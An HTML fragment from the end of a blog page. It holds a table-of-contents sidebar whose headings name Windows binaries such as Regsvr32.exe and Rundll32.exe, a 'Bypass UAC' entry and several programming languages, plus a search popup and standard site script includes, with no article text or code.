href="#Regsvcs-exe"><span class="nav-number">2.9.</span> <span class="nav-text">Regsvcs.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Regasm-exe"><span class="nav-number">2.10.</span> <span class="nav-text">Regasm.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Regsvr32-exe"><span class="nav-number">2.11.</span> <span class="nav-text">Regsvr32.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rundll32-exe"><span class="nav-number">2.12.</span> <span class="nav-text">Rundll32.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-UAC"><span class="nav-number">2.13.</span> <span class="nav-text">Bypass UAC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Multiple-Programming-Language"><span class="nav-number">3.</span> <span class="nav-text">Multiple Programming Language</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Powershell"><span class="nav-number">3.1.</span> <span class="nav-text">Powershell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Golang"><span class="nav-number">3.2.</span> <span class="nav-text">Golang</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP"><span class="nav-number">3.3.</span> <span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python"><span class="nav-number">3.4.</span> <span class="nav-text">Python</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>



    
<script src="/js/local-search.js"></script>




    
<script src="/js/code-copy.js"></script>





<div class="post-scripts">
    
        
<script src="/js/left-side-toggle.js"></script>

<script src="/js/libs/anime.min.js"></script>

<script src="/js/toc.js"></script>

    
</div>



</body>
</html>
